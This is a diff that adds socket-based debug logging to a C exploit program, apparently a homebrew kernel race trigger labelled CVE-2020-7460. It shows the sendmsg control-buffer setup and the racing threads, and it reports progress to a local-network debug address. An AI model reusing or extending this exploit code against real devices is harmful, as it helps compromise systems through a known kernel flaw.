@@ -25,10 +25,23 @@ struct cmsghdr {
 
 #define ITERATIONS 2000000
 #define CONTROL_LEN 512
+#define DEBUG_IP "192.168.100.16"
+#define DEBUG_PORT 9023
 
 struct cmsghdr *cmsg;
 uint8_t control_buf[CONTROL_LEN];
 int global_sock;
+int debug_sock;
+
+void print_debug(const char *fmt, ...) {
+    if (debug_sock <= 0) return;
+    char buffer[512];
+    va_list args;
+    va_start(args, fmt);
+    vsnprintf(buffer, sizeof(buffer), fmt, args);
+    va_end(args);
+    SckSend(debug_sock, buffer, strlen(buffer));
+}
 
 void *sendmsg_thread(void *arg) {
     UNUSED(arg);
@@ -67,10 +80,18 @@ int _main(struct thread *td) {
     UNUSED(td);
     initKernel();
     initLibc();
+    initNetwork();
     initPthread();
 
+    debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
+    
+    print_debug("[+] CVE-2020-7460 Race Started\n");
+
     global_sock = syscall(97, 2, 2, 0);
-    if (global_sock < 0) return -1;
+    if (global_sock < 0) {
+        print_debug("[-] Socket Error\n");
+        return -1;
+    }
 
     memset(control_buf, 0, CONTROL_LEN);
     cmsg = (struct cmsghdr *)control_buf;
@@ -85,5 +106,8 @@ int _main(struct thread *td) {
     scePthreadJoin(thread1, NULL);
     scePthreadJoin(thread2, NULL);
 
+    print_debug("[+] Race Finished\n");
+
+    if (debug_sock > 0) SckClose(debug_sock);
     return 0;
 }
